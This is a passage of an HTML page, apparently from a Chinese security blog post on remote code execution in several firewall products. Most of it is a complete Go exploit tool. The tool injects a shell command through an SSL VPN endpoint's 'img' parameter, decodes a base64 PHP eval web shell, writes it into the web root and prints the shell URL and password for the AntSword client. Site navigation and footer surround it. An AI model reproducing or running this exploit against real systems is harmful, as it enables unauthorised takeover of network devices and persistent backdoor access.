+</span></span><span class="line"><span class="cl">	<span class="nx">ExpManager</span><span class="p">.</span><span class="nf">AddExploit</span><span class="p">(</span><span class="nf">NewExploit</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">goutils</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">expJson</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="kc">nil</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="kc">nil</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="另外一个点">另外一个点</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;crypto/tls&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/fatih/color&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/hpifu/go-kit/hflag&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/imroc/req/v3&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/liushuochen/gotable&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/liushuochen/gotable/table&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;github.com/thanhpk/randstr&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">now</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">host</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">:=</span> <span class="nf">getUserParams</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exploit</span><span class="p">(</span><span class="nx">host</span><span class="p">,</span> <span class="nx">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">GreenString</span><span class="p">(</span><span class="s">&#34;Total Use Time : %s\n&#34;</span><span class="p">,</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Since</span><span class="p">(</span><span class="nx">now</span><span class="p">).</span><span class="nf">String</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">httpReqClient</span><span class="p">()</span> <span class="o">*</span><span class="nx">req</span><span class="p">.</span><span class="nx">Client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">reqHeader</span> <span class="p">=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;User-Agent&#34;</span><span class="p">:</span>      <span class="s">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;Accept&#34;</span><span class="p">:</span>          <span class="s">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s">&#34;gzip, deflate, br&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s">&#34;zh-CN,zh-TW;q=0.9,zh;q=0.8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;Connection&#34;</span><span class="p">:</span>      <span class="s">&#34;close&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span> <span class="o">:=</span> <span class="nx">req</span><span class="p">.</span><span class="nf">C</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">reqHeaderName</span><span class="p">,</span> <span class="nx">reqHeaderValue</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">reqHeader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">cli</span><span class="p">.</span><span class="nf">SetCommonHeader</span><span class="p">(</span><span class="nx">reqHeaderName</span><span class="p">,</span> <span class="nx">reqHeaderValue</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nf">EnableForceHTTP1</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nf">SetTLSFingerprintSafari</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nf">SetTimeout</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nf">SetRedirectPolicy</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nf">NoRedirectPolicy</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nf">SetAutoDecodeAllContentType</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cli</span><span class="p">.</span><span class="nx">TLSClientConfig</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">tls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span><span class="nx">InsecureSkipVerify</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">MinVersion</span><span class="p">:</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">VersionTLS10</span><span class="p">,</span> <span class="nx">MaxVersion</span><span class="p">:</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">VersionTLS13</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">cli</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">getUserParams</span><span class="p">()</span> <span class="p">(</span><span class="nx">host</span><span class="p">,</span> <span class="nx">proxyAddr</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">hflag</span><span class="p">.</span><span class="nf">AddFlag</span><span class="p">(</span><span class="s">&#34;target&#34;</span><span class="p">,</span> <span class="s">&#34;目标地址&#34;</span><span class="p">,</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Required</span><span class="p">(),</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Shorthand</span><span class="p">(</span><span class="s">&#34;t&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">hflag</span><span class="p">.</span><span class="nf">AddFlag</span><span class="p">(</span><span class="s">&#34;proxy&#34;</span><span class="p">,</span> <span class="s">&#34;代理地址&#34;</span><span class="p">,</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Shorthand</span><span class="p">(</span><span class="s">&#34;p&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">RedString</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Usage</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">target</span> <span class="o">:=</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="s">&#34;target&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">proxyString</span> <span class="o">:=</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="s">&#34;proxy&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">target</span><span class="p">,</span> <span class="nx">proxyString</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">randFile</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">filename</span> <span class="o">:=</span> <span class="nx">randstr</span><span class="p">.</span><span class="nf">Hex</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">filename</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">fmtTable</span><span class="p">()</span> <span class="o">*</span><span class="nx">table</span><span class="p">.</span><span class="nx">Table</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">tab</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">gotable</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">GreenString</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;Shell连接工具&#34;</span><span class="p">),</span> <span class="nx">color</span><span class="p">.</span><span class="nf">RedString</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;Shell连接地址&#34;</span><span class="p">),</span> <span class="nx">color</span><span class="p">.</span><span class="nf">BlueString</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;Shell连接密码&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">tab</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">p</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">filename</span> <span class="o">:=</span> <span class="nf">randFile</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;.php&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">vulPath</span> <span class="o">:=</span> <span class="s">&#34;/sslvpn/sk403.php?client=logoImg&amp;img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/&#34;</span> <span class="o">+</span> <span class="nx">filename</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fullURL</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="nx">vulPath</span><span class="p">,</span> <span class="s">&#34;//ss&#34;</span><span class="p">,</span> <span class="s">&#34;/ss&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">client</span> <span class="o">:=</span> <span class="nf">httpReqClient</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">p</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">client</span><span class="p">.</span><span class="nf">SetProxyURL</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">client</span><span class="p">.</span><span class="nf">R</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="nx">fullURL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">_</span> <span class="p">=</span> <span class="nx">get</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}()</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ShellURL</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="s">&#34;/sslvpn/&#34;</span><span class="o">+</span><span class="nx">filename</span><span class="p">,</span> <span class="s">&#34;//ss&#34;</span><span class="p">,</span> <span class="s">&#34;/ss&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">get</span><span class="p">.</span><span class="nx">StatusCode</span> <span class="o">==</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">get</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="s">&#34;/usr/local/webui/sslvpn/&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">t2</span> <span class="o">:=</span> <span class="nf">fmtTable</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">_</span> <span class="p">=</span> <span class="nx">t2</span><span class="p">.</span><span class="nf">AddRow</span><span class="p">([]</span><span class="kt">string</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                <span class="s">&#34;AntSword&#34;</span><span class="p">,</span> <span class="nx">ShellURL</span><span class="p">,</span> <span class="s">&#34;c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">t2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">RedString</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;站点不存在漏洞,安全的很&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" data-title="多个防火墙产品RCE" data-via="xxxx" data-hashtags="2023hw漏洞"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" data-hashtag="2023hw漏洞"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" data-title="多个防火墙产品RCE"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" data-title="多个防火墙产品RCE"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" data-title="多个防火墙产品RCE"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%A4%A7%E4%B8%BA-lnnojet-%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E5%8D%8F%E5%90%8C%E5%88%9B%E6%96%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="prev" rel="prev" title="大为 lnnojet 知识产权协同创新管理系统管理员密码重置"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>大为 lnnojet 知识产权协同创新管理系统管理员密码重置</a>
+            <a href="/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/" class="next" rel="next" title="基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）">基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
